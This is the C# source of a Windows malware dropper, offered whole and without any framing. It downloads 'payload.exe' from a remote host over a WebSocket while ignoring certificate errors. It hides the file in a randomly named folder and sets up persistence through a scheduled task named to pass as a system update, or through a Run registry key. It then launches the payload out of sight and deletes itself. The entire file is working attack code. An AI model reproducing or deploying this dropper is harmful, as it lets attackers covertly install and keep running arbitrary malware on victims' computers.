using System;
using System.IO;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Net;

class Drophold
{
    static async Task Main()
    {
        string dropPath = GetDropPath();
        string exePath = Path.Combine(dropPath, "payload.exe");

        if (!Directory.Exists(dropPath))
            Directory.CreateDirectory(dropPath);

        File.SetAttributes(dropPath, FileAttributes.Hidden);

        try
        {
            await DownloadFile("wss://192.168.0.54/payload", exePath);
            File.SetAttributes(exePath, FileAttributes.Hidden);
            SetupPersistence(exePath);
            ExecutePayload(exePath);
        }
        catch (Exception) { }

        SelfDestruct();
    }

    static string GetDropPath()
    {
        string basePath = IsAdmin() ? "C:\\ProgramData" : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
        string folderName = Path.GetRandomFileName().Replace(".", "");
        return Path.Combine(basePath, folderName);
    }

    static bool IsAdmin()
    {
        return new System.Security.Principal.WindowsPrincipal(System.Security.Principal.WindowsIdentity.GetCurrent())
            .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
    }

    static async Task DownloadFile(string url, string filePath)
    {
        try
        {
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            using (ClientWebSocket ws = new ClientWebSocket())
            {
                for (int attempts = 0; attempts < 3; attempts++)
                {
                    try
                    {
                        await ws.ConnectAsync(new Uri(url), CancellationToken.None);
                        break;
                    }
                    catch (Exception) when (attempts < 2)
                    {
                        await Task.Delay(2000);
                    }
                }

                using (FileStream fs = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                {
                    byte[] buffer = new byte[4096];
                    WebSocketReceiveResult result;
                    do
                    {
                        result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                        await fs.WriteAsync(buffer, 0, result.Count);
                    } while (!result.EndOfMessage);
                }
            }
        }
        catch (Exception) { }
    }

    static void SetupPersistence(string exePath)
    {
        string taskName = "SystemUpdate" + Path.GetRandomFileName().Substring(0, 5);
        if (IsAdmin())
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = $"/create /tn {taskName} /tr \"{exePath}\" /sc onlogon /rl highest /f",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
        }
        else
        {
            Microsoft.Win32.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", taskName, exePath);
        }
    }

    static void ExecutePayload(string exePath)
    {
        Process.Start(new ProcessStartInfo
        {
            FileName = exePath,
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            UseShellExecute = false
        });
    }

    static void SelfDestruct()
    {
        string batchScript = $"@echo off\ntimeout /t 3 /nobreak > nul\ndel \"{System.Reflection.Assembly.GetExecutingAssembly().Location}\"";
        string batchFile = Path.GetTempFileName() + ".bat";
        File.WriteAllText(batchFile, batchScript);
        Process.Start(new ProcessStartInfo { FileName = batchFile, WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
    }
}
